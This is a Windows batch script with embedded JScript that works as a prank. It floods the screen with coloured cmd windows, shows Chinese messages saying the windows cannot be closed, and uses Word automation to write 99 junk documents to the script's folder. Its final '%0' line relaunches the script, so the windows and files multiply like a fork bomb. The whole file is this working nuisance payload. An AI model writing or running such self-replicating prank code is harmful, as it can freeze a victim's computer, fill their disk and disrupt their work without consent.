@start cmd | start cmd
@color a
我喜欢你
@color b
你关不点
@color c
以后你就是我的人了
@color a
@start cmd | color 1
@start cmd | color 2
@start cmd | color 3
@start cmd | color 4
@start cmd | color 5
@start cmd | color 6
@start cmd | color a
@start cmd | color b
@start cmd | color c
@start cmd | color d
@start cmd | color e
@start cmd | color f
@start cmd | color 1a
@start cmd | color 1b
@start cmd | color 1c 
@start cmd | color 1d
@start cmd | color 1f
@start cmd | color 1e
@start cmd | color 2a
@start cmd | color 2b
@start cmd | color 2c
@start cmd | color 2d
@start cmd | color 2e
@start cmd | color 2f
@start cmd | color 3a
@start cmd | color 3b
@start cmd | color 3c
/*&cls
rem 创建doc文档并写入随意内容
title %@% +%#%%#% %z%
set 数量=99
cscript -nologo -e:jscript "%~f0" "%~dp0" %数量% 
echo;%@% +%#%%#% %z%
*/
var wordapp=new ActiveXObject('Word.Application');
for(var i=1;i<=Number(WSH.Arguments(1));i++){
    var doc=wordapp.Documents.Add();
    var selection=wordapp.selection;
    selection.TypeText(Math.random().toString());
    doc.SaveAs(WSH.Arguments(0)+'test'+i+'.txt');
    doc.Close();
}
%0
